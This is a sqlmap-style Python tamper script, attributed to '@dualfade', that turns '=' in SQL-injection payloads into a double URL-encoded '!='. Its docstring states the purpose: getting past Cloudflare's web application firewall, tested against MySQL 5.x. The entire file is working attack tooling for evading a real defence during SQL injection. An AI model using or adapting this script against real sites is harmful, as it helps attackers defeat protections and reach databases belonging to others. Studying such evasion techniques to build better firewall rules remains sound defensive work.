#!/usr/bin/env python
# cloudflareeq.py
# @dualfade

import re

def tamper(payload, **kwargs):
    """
    Replaces ('=') with ('!=') '%25%32%31%25%33%64'

    Tested against:
        * MySQL 5.x

    Notes:
        * Custom to bypass CloudFlare 01112022
    """

    retVal = payload

    if payload:
        for match in re.finditer(r"\b(=)\b", retVal):
            if len(match.group(1)) == 1:
                s = str(match.group(1))
                s = "!="
                # urlencodeall --
                e = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in s)

                # urlencode each encoded char --
                x = e.split("%")
                y = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in e)
                retVal = retVal.replace(match.group(1), y)

            else:
                pass

        # ret --
        return retVal

